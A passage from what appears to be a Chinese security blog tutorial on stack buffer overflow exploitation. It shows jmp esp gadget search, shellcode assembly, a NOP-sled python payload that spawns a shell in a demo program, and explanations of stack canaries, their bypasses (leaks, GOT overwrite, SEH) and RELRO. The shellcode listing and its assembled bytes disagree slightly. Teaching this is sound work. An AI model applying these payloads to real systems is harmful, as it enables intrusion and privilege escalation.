&lt;/pre&gt;
&lt;p&gt;看9~18行可以发现buf的地址为ebp-0x12,我们是不是可以直接跳转到硬编码的buf地址呢?&lt;br/&gt;我们可以自己试验每次断点在foo时打印寄存器值:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(gdb) b foo
Breakpoint 1 at 0x656: file victim.c, line 5.
(gdb) run
...
(gdb) info reg
eax            0xf7fa6dbc   -134582852
ecx            0xffffc5a0   -14944
edx            0xffffc5c4   -14908
ebx            0x804a000    134520832
esp            0xffffc560   0xffffc560
ebp            0xffffc578   0xffffc578
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在我的电脑上, 发现每次ebp的值都是一样, 但其实机器重启后很可能就不同了,&lt;br/&gt;而且不同操作系统也会有所差异. 所以将返回地址覆盖为&lt;code&gt;0xffffc578-0x12&lt;/code&gt;并不是个通用的方法.&lt;/p&gt;
&lt;p&gt;虽然栈地址不是固定的, 但程序地址总是固定的, 所以聪明的黑客想到了利用程序里&lt;code&gt;jmp esp&lt;/code&gt;或&lt;code&gt;call esp&lt;/code&gt;之类的&lt;br/&gt;指令片段来将执行流引导到我们的shellcode上. 为此, 我们就要从程序代码中寻找包含改指令的片段,&lt;br/&gt;看看我们想要的这两条指令的机器码是什么:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rasm2 -a x86 -b 32 &quot;nop; jmp esp&quot;
90ffe4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于大型程序而言, 找几个字节不是难事, 但我们这种小程序就比较难找到, 所以我为了方便就加了个&lt;br/&gt;dummy函数, 来模拟大型程序中查找代码段的过程. 可以用radare2或rafind2来查找:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ r2 ./victim
[0x08048390]&amp;gt; /x 90ffe4
Searching 3 bytes in [0x8048000-0x8048754]
hits: 1
Searching 3 bytes in [0x8049f08-0x804a028]
hits: 0
0x08048520 hit0_0 90ffe4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也可以通过objdump:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ objdump -d ./victim -M intel | grep 'ff e4' -B 1
 8048520:   90                      nop
 8048521:   ff e4                   jmp    esp&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样我们的返回地址就能确定了, 即0x08048520. 不过这里有个小细节就是scanf会被空格(\x20)截断,&lt;br/&gt;所以特地加了个空指令并令返回地址为0x08048521.&lt;/p&gt;
&lt;h2 id=&quot;shellcode编写和payload构造&quot;&gt;shellcode编写和payload构造&lt;/h2&gt;
&lt;p&gt;对于shellcode的编写, 如果逻辑简单则很容易, 可以直接写汇编再转为机器码即可;&lt;br/&gt;如果逻辑复杂点, 只是执行系统调用的话依旧可以单独写; 而对于复杂的例子, 例如执行system库函数,&lt;br/&gt;并指定第一个参数为&quot;/bin/sh&quot;字符串(的地址), 就要先找到system函数的地址, 然后按照调用约定来调用.&lt;/p&gt;
&lt;p&gt;先看简单的, 比如直接退出, 这里可以用&lt;code&gt;_exit&lt;/code&gt;系统调用, 汇编为:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebx&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中0x01是&lt;code&gt;exit&lt;/code&gt;的系统调用号, ebx为参数, 即我们想程序立刻结束并返回66. 用rasm2来编译:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rasm2 -a x86 -b 32 -f shellcode.asm 
b801000000bb42000000cd80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配合前面确定的返回地址, 可以构造一个payload:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python -c &quot;print 'A'*22 + '\x21\x85\x04\x08' + '\x90'*50 + '\xb8\x01\x00\x00\x00\xbb\x42\x00\x00\x00\xcd\x80'&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里注意返回地址是小端字节序. 还有payload写在返回地址的后面而不是前面, 因为在函数返回后,&lt;br/&gt;经过了&lt;code&gt;leave&lt;/code&gt;和&lt;code&gt;ret&lt;/code&gt;指令, 已经恢复了原来的栈帧(原本被保护性压入栈, 即高地址中).&lt;br/&gt;&lt;code&gt;'\x90'*50&lt;/code&gt;的作用是填充nop指令, 可以提高payload的鲁棒性, 不用精确指定指令起始地址也能执行,&lt;br/&gt;通常称为&lt;code&gt;NOP sled&lt;/code&gt;. 测试下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 正常执行
$ echo &quot;world&quot; | ./victim 
hello world
good bye!
$ echo $?
0
# payload执行
$ python -c &quot;print 'A'*22 + '\x21\x85\x04\x08' + '\x90'*50 + '\xb8\x01\x00\x00\x00\xbb\x42\x00\x00\x00\xcd\x80'&quot; | ./victim
hello AAAAAAAAAAAAAAAAAAAAAA!����������������������������������������������������
$ echo $?
66&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二次优雅地退出了, 并且返回码是我们所期望的66. 仅仅是利用系统调用, 就可以实现足够丰富的功能.&lt;br/&gt;关于Linux系统调用的文档, 可以通过&lt;code&gt;man syscalls&lt;/code&gt;查看.&lt;/p&gt;
&lt;p&gt;在现实世界中, 如果我们想要执行更复杂的指令, 那必然会用到库函数, 所以再看一个例子,&lt;br/&gt;注入payload来获取一个交互式的shell. 之前也说过, 其实就是执行&lt;code&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt;函数,&lt;br/&gt;但关键是要获取system函数的地址. system是标准的库函数, 一般存在于libc动态链接库中:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ LD_TRACE_LOADED_OBJECTS=1 ./victim 
    linux-gate.so.1 (0xf7fd7000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7df1000)
    /lib/ld-linux.so.2 (0xf7fd9000)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据输出知道libc.so会被加载到0xf7df1000这个地址上.&lt;/p&gt;
&lt;blockquote readability=&quot;4.1693989071038&quot;&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;: 曾经我以为&lt;code&gt;ldd&lt;/code&gt;命令也能获取类似的结果, 但后来发现其结果不一定准确!&lt;br/&gt;详见&lt;a href=&quot;https://reverseengineering.stackexchange.com/questions/6657/why-does-ldd-and-gdb-info-sharedlibrary-show-a-different-library-base-addr&quot;&gt;why-does-ldd-and-gdb-info-sharedlibrary-show-a-different-library-base-addr&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来看看system函数相对于libc.so的偏移:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rabin2 -s /lib/i386-linux-gnu/libc.so.6 | grep system
246 0x00113de0 0x00113de0 GLOBAL   FUNC   68 svcerr_systemerr
628 0x0003ab30 0x0003ab30 GLOBAL   FUNC   55 __libc_system
1461 0x0003ab30 0x0003ab30   WEAK   FUNC   55 system
# 或者用`readelf`:
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   246: 00113de0    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   628: 0003ab30    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1461: 0003ab30    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
# 或者用`nm`工具也是可以的:
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
0003ab30 T __libc_system
00113de0 T svcerr_systemerr
0003ab30 W system&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不管用哪种方法, 偏移量都应该是相同的. 所以, system函数地址应该是0xf7df1000 + 0x3ab30:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rax2 =16 0xf7df1000+0x3ab30
0xf7e2bb30&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后, 还需要找到&quot;/bin/sh&quot;这个字符串的地址:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rafind2 -z -s /bin/sh ./victim&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;很不幸, 没有找到. 再在libc里找下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rafind2 -z -s /bin/sh /lib/i386-linux-gnu/libc.so.6
0x15ce48
$ rax2 =16 0xf7df1000+0x15ce48
0xf7f4de48&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;找到了! 然后用该偏移加上libc加载地址即可. 哦, 这位问了, 要是还是没找到怎么办?&lt;br/&gt;没关系, 我们还可以用环境变量自己传进去! 而且既然我们能控制payload, 那也写在payload里!&lt;br/&gt;举例shellcode如下:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;co&quot;&gt;; shellcode_sh.asm&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt; 0x68732f2f&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt; 0x6e69622f&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0xf7e2cb30&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编译, 用&lt;code&gt;rasm2 -C&lt;/code&gt;直接产生C数组兼容的输出:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rasm2 -a x86 -b 32 -f shellcode_sh.asm -C
&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe0\x50\xbb\x30\xbb\xe2&quot; \
&quot;\xf7\xff\xd3&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ (python -c &quot;print 'A'*22 + '\x21\x85\x04\x08' + '\x90'*50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe0\x50\xbb\x30\xbb\xe2\xf7\xff\xd3'&quot; &amp;amp;&amp;amp; cat) | ./victim
hello AAAAAAAAAAAAAAAAAAAAAA!���������������������������������������������������1�Ph//shh/bin��P�0�����
whoami
pan
uname -a
Linux debian 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功获得交互式的shell! 如果victim程序有suid权限的话, 还可以用来获取具有root权限的shell.&lt;br/&gt;值得一提的是, 这里输入payload用&lt;code&gt;(python -c &quot;print 'xxx'&quot; &amp;amp;&amp;amp; cat) | ./victim&lt;/code&gt;的方式,&lt;br/&gt;为什么这里要加&lt;code&gt;&amp;amp;&amp;amp; cat&lt;/code&gt;而之前不用? 这是管道的工作机制决定的, python打印payload之后马上结束,&lt;br/&gt;从而关闭了管道的写端, 导致虽然执行了命令但没法获得交互, 所以要用cat命令来维持住.&lt;br/&gt;至此, 一个基本的栈溢出利用过程已经介绍完毕.&lt;/p&gt;

&lt;p&gt;canary value, 即金丝雀值, 是一个缓解栈溢出漏洞的基本方式. 为什么要叫这个名字?&lt;br/&gt;因为金丝雀比较敏感脆弱, 以前人们在进入煤矿的时候会拿一只金丝雀在手上, 用来检测&lt;br/&gt;一氧化碳等有毒气体. 在环境异常时, 金丝雀会比人先出现反应, 可以用来作为一个警告信号.&lt;br/&gt;在二进制中, canary则用来在恶意payload执行之前, 检测栈帧的异常.&lt;/p&gt;
&lt;h2 id=&quot;原理&quot;&gt;原理&lt;/h2&gt;
&lt;p&gt;Stack Canaries通常是在函数的prologue和epilogue中插入完整性校验的代码, 如果校验异常则&lt;br/&gt;进入系统异常处理的流程. canary一般分为终止型(Terminator)和随机型(Random), Terminator&lt;br/&gt;指一些函数会被终止符截断, 比如之前的scanf会被空格截断, strcpy()会被NULL截断,&lt;br/&gt;gets()会被换行截断, 等等, 常见的终止符包括NULL(0x00), CR(0x0d), LF(0x0a)以及EOF(0xff);&lt;br/&gt;Random型canary通常的实现方式是, 在栈中返回地址之前保存一个小的整数, 并且程序在跳转到返回地址之前&lt;br/&gt;会对该整数进行校验, 若校验出错则直接进入软件异常. 而这个小整数则是在程序启动时随机生成的.&lt;br/&gt;其介绍以及各个编译器的实现方式可以参考&lt;a href=&quot;https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries&quot;&gt;维基百科的Buffer overflow protection&lt;/a&gt;.&lt;br/&gt;另外有兴趣也可以看看&lt;a href=&quot;https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf&quot;&gt;这篇文章&lt;/a&gt;, 其介绍了(Linux类系统下)最初的实现.&lt;br/&gt;canary的插入点一般如下右图所示:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;            Process Address                                   Process Address
            Space                                             Space
           +---------------------+                           +---------------------+
           |                     |                           |                     |
   0xFFFF  |  Top of stack       |                   0xFFFF  |  Top of stack       |
       +   |                     |                       +   |                     |
       |   +---------------------+                       |   +---------------------+
       |   |  malicious code     &amp;lt;-----+                 |   |  malicious code     |
       |   +---------------------+     |                 |   +---------------------+
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   |                     |     |                 |   |                     |
       |   +---------------------|     |                 |   +---------------------|        
       |   |  return address     |     |                 |   |  return address     |
       |   +---------------------+     |                 |   +---------------------|
 stack |   |  saved EBP          +-----+           stack |   |  saved EBP          |
growth |   +---------------------+                growth |   +---------------------+
       |   |  local variables    |                       |   | **stack canary**    |
       |   +---------------------+                       |   +---------------------+
       |   |                     |                       |   |  local variables    |
       |   |  buffer             |                       |   +---------------------+
       |   |                     |                       |   |                     |
       |   |                     |                       |   |  buffer             |
       |   +---------------------+                       |   |                     |
       |   |                     |                       |   |                     |
       |   |                     |                       |   +---------------------+
       |   |                     |                       |   |                     |
       v   |                     |                       v   |                     |
   0x0000  |                     |                   0x0000  |                     |
           +---------------------+                           +---------------------+&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;实现&quot;&gt;实现&lt;/h2&gt;
&lt;p&gt;这里以&lt;code&gt;glibc 2.26&lt;/code&gt;为例(各个版本的libc源码可以在&lt;a href=&quot;https://ftp.gnu.org/gnu/libc/&quot;&gt;这里下载&lt;/a&gt;), canary实现相关的代码在&lt;code&gt;libc-start.c&lt;/code&gt;中:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;co&quot;&gt;/* Set up the stack checker's canary.  */&lt;/span&gt;
uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
&lt;span class=&quot;co&quot;&gt;// ...&lt;/span&gt;
__stack_chk_guard = stack_chk_guard;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;_dl_setup_stack_chk_guard&lt;/code&gt;函数的实现如下:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;inline&lt;/span&gt; uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; *dl_random)
{
  &lt;span class=&quot;kw&quot;&gt;union&lt;/span&gt;
  {
    uintptr_t num;
    &lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; bytes[&lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt; (uintptr_t)];
  } ret = { &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt; };
  &lt;span class=&quot;co&quot;&gt;// __stack_chk_guard为terminator型canary&lt;/span&gt;
  &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (dl_random == NULL)
    {
      ret.bytes[&lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt; (ret) - &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;] = &lt;span class=&quot;dv&quot;&gt;255&lt;/span&gt;;
      ret.bytes[&lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt; (ret) - &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;] = &lt;span class=&quot;ch&quot;&gt;'\n'&lt;/span&gt;;
    }
  &lt;span class=&quot;co&quot;&gt;// __stack_chk_guard为random型canary&lt;/span&gt;
  &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt;
    {
      memcpy (ret.bytes, dl_random, &lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt; (ret));
&lt;span class=&quot;ot&quot;&gt;#if BYTE_ORDER == LITTLE_ENDIAN&lt;/span&gt;
      ret.num &amp;amp;= ~(uintptr_t) &lt;span class=&quot;bn&quot;&gt;0xff&lt;/span&gt;;
&lt;span class=&quot;ot&quot;&gt;#elif BYTE_ORDER == BIG_ENDIAN&lt;/span&gt;
      ret.num &amp;amp;= ~((uintptr_t) &lt;span class=&quot;bn&quot;&gt;0xff&lt;/span&gt; &amp;lt;&amp;lt; (&lt;span class=&quot;dv&quot;&gt;8&lt;/span&gt; * (&lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt; (ret) - &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)));
&lt;span class=&quot;ot&quot;&gt;#else&lt;/span&gt;
&lt;span class=&quot;ot&quot;&gt;# error &quot;BYTE_ORDER unknown&quot;&lt;/span&gt;
&lt;span class=&quot;ot&quot;&gt;#endif&lt;/span&gt;
    }
  &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; ret.num;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到根据&lt;code&gt;dl_random&lt;/code&gt;的值是否为空, 该函数分别实现了terminator型和random型的canary.&lt;/p&gt;
&lt;h2 id=&quot;绕过方法&quot;&gt;绕过方法&lt;/h2&gt;
&lt;p&gt;由于栈canary在编译期修改了函数的prologue和epilogue来分别设置和检测canary值,&lt;br/&gt;所以当发生溢出并尝试利用时, 在覆盖返回地址的途中, 必然也会覆盖到canary的地址.&lt;br/&gt;当程序检测到canary值异常, 就会立刻进入系统的默认异常处理流程中. 那么如何绕过?&lt;br/&gt;一般来说, (random型canary)有如下几种方式:&lt;/p&gt;
&lt;h3 id=&quot;覆盖canary&quot;&gt;覆盖canary&lt;/h3&gt;
&lt;p&gt;既然程序只是检测canary的值, 那我们就覆盖成真正的值不就好了? 所以关键是如何得到&lt;br/&gt;原来的canary值, 具体来说有以下几种方法.&lt;/p&gt;
&lt;h4 id=&quot;爆破&quot;&gt;爆破&lt;/h4&gt;
&lt;p&gt;对于静态型每次不变的canary, 我们可以通过暴力破解的方式把该值测出来. 听起来不太现实?&lt;br/&gt;考虑这样一种网络程序, 接受一个tcp链接, 然后fork一个子进程去处理该链接的交互.&lt;br/&gt;由于子进程会继承父进程的地址空间, 所以canary值也是相同的, 通过不断fuzzy子进程(们),&lt;br/&gt;便可以得到canary的精确值, 再构造payload, 一个RCE就诞生了!&lt;/p&gt;
&lt;h4 id=&quot;信息泄露&quot;&gt;信息泄露&lt;/h4&gt;
&lt;p&gt;另一个想法是通过泄露canary值来写入相同的值以绕过检测. 这通常和实际的代码有关,&lt;br/&gt;比如以下代码片段:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; foo() {
    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;];
    fgets(buf, &lt;span class=&quot;kw&quot;&gt;sizeof&lt;/span&gt;(buf), stdin);
    printf(buf);
}
&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; bar() {
    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;];
    scanf(&lt;span class=&quot;st&quot;&gt;&quot;%s&quot;&lt;/span&gt;, buf);
}
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main() {
    foo();
    bar();
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到bar中有个栈溢出, 但是因为开启了canary无法直接利用, 不过在foo中,&lt;br/&gt;我们可以控制打印的内容! 所以只要在foo中将打印内容控制为canary的地址(注意不要破坏canry),&lt;br/&gt;并且通过泄露的信息, 在利用bar时便能成功绕过canary的检测. 虽然这里是为了方便举了个&lt;br/&gt;简单的例子, 但实际中类似这样信息泄露的地方也是屡见不鲜的.&lt;/p&gt;
&lt;h3 id=&quot;覆盖got&quot;&gt;覆盖GOT&lt;/h3&gt;
&lt;p&gt;由于canary的校验是在返回之前, 所以我们才不能覆盖返回地址来执行shellcode,&lt;br/&gt;那么反过来想, 如果我们能在canary校验之前执行shellcode, 不就可以了吗?&lt;br/&gt;考虑如下函数:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;co&quot;&gt;// relocs.c&lt;/span&gt;
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main() {
    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;];
    fscanf(stdin, &lt;span class=&quot;st&quot;&gt;&quot;%s&quot;&lt;/span&gt;, buf);
    printf(&lt;span class=&quot;st&quot;&gt;&quot;input is %s&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;, buf);
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;一个很常见的执行流程, 也没有足够的信息泄露, 那么该如何利用? 这就要说到Linux动态&lt;br/&gt;链接库的加载过程了, 如果你还不清楚GOT/PLT的工作过程, 可以参考&lt;a href=&quot;https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries&quot;&gt;这篇文章&lt;/a&gt;和&lt;a href=&quot;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&quot;&gt;这篇文章&lt;/a&gt;.&lt;br/&gt;简而言之, 动态链接的可执行程序, 其使用到的外部变量的偏移存放于GOT(global offset table)&lt;br/&gt;中, 而使用到的外部函数存放于PLT(Procedure Linkage Table)中, 其中PLT又实现了延时加载,&lt;br/&gt;只会在第一次时将用到的函数地址加载到某个地方(.got.plt), 之后直接从该地方读取.&lt;/p&gt;
&lt;p&gt;以一个刚刚的文件为例, 编译并查看符号表:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gcc -m32 relocs.c -o relocs
$ readelf --relocs ./relocs 

Relocation section '.rel.dyn' at offset 0x3bc contains 10 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  00000008 R_386_RELATIVE   
00001eec  00000008 R_386_RELATIVE   
00001ff4  00000008 R_386_RELATIVE   
0000201c  00000008 R_386_RELATIVE   
00001fe4  00000106 R_386_GLOB_DAT    00000000   _ITM_deregisterTMClone
00001fe8  00000406 R_386_GLOB_DAT    00000000   __cxa_finalize@GLIBC_2.1.3
00001fec  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
00001ff0  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
00001ff8  00000806 R_386_GLOB_DAT    00000000   _Jv_RegisterClasses
00001ffc  00000906 R_386_GLOB_DAT    00000000   _ITM_registerTMCloneTa

Relocation section '.rel.plt' at offset 0x40c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0000200c  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
00002010  00000307 R_386_JUMP_SLOT   00000000   __isoc99_fscanf@GLIBC_2.7
00002014  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到stdin是外部变量, 而printf则是外部函数, 都在libc.so里面. 查看对应的section:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ readelf -S relocs | egrep 'got|plt'
  [10] .rel.plt          REL             0000040c 00040c 000018 08  AI  5  24  4
  [12] .plt              PROGBITS        00000450 000450 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        00000490 000490 000010 00  AX  0   0  8
  [23] .got              PROGBITS        00001fe4 000fe4 00001c 04  WA  0   0  4
  [24] .got.plt          PROGBITS        00002000 001000 000018 04  WA  0   0  4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发现plt是可执行的, 但是不可写; 而got则是可写的, 确不可执行. 之前也说了,&lt;br/&gt;外部函数会被动态加载到&lt;code&gt;.got.plt&lt;/code&gt;对应的偏移中, 它的本质也只是一个含有众多函数指针的数组.&lt;br/&gt;所以, 如果我们能通过溢出来改写这个表对应函数的地址, 不就可以实现执行了吗?&lt;/p&gt;
&lt;p&gt;举例来说, relocs.c中的fscanf中存在溢出, 那么我们通过溢出, &lt;a href=&quot;mailto:修改了printf@got.plt的地址&quot;&gt;修改了printf@got.plt的地址&lt;/a&gt;,&lt;br/&gt;不就可以在main函数返回之前(校验canary之前)执行我们所构造的shellcode了吗?&lt;br/&gt;实际上, 这也正式当前最常用的绕过canary的方式了.&lt;/p&gt;
&lt;h3 id=&quot;seh&quot;&gt;SEH&lt;/h3&gt;
&lt;p&gt;SEH(Structured Exception Handler)是&lt;strong&gt;Windows系统&lt;/strong&gt;特有的处理异常方式.&lt;br/&gt;我们注意到当canary异常时会进入异常处理中, 如果异常处理代码的地址也是在栈空间上的话,&lt;br/&gt;我们可以随意覆盖canary和返回地址, 并把异常处理的代码地址覆盖为我们的payload地址,&lt;br/&gt;同样也是可以实现程序执行流程的控制.&lt;/p&gt;

&lt;p&gt;在2001年, &lt;a href=&quot;https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&quot;&gt;teso安全团队的文章&lt;/a&gt;中描述了覆盖&lt;code&gt;.got.plt&lt;/code&gt;段来截获控制流的方法.&lt;br/&gt;而在2004年, 就有了这种利用手法的防护, 称为重定向只读, 即RELRO.&lt;/p&gt;
&lt;p&gt;RELRO的作用是将重定向表设置为只读. 实际上RELRO也包含了两个层级的防护,&lt;br/&gt;即Partial RELRO和Full RELRO.&lt;/p&gt;
&lt;p&gt;Partial RELRO(链接时通过&lt;code&gt;ld -z relro&lt;/code&gt;指定), 其作用大致是:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;将&lt;code&gt;.got&lt;/code&gt;段映射为只读, 不过&lt;code&gt;.got.plt&lt;/code&gt;还是可写的.&lt;/li&gt;
&lt;li&gt;重新排列各个section来减少全局变量溢出到控制结构中的可能性.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Full RELRO(链接时通过&lt;code&gt;ld -z relro -z now&lt;/code&gt;指定), 其作用是:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;执行Partial RELRO相关的操作.&lt;/li&gt;
&lt;li&gt;在链接时解析所有符号.&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;.got.plt&lt;/code&gt;合并到&lt;code&gt;.got&lt;/code&gt;中.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;因此, Full RELRO可以防止&lt;code&gt;.got.plt&lt;/code&gt;中的函数指针被覆盖.&lt;br/&gt;如何绕过? 请看下节分解:)&lt;/p&gt;

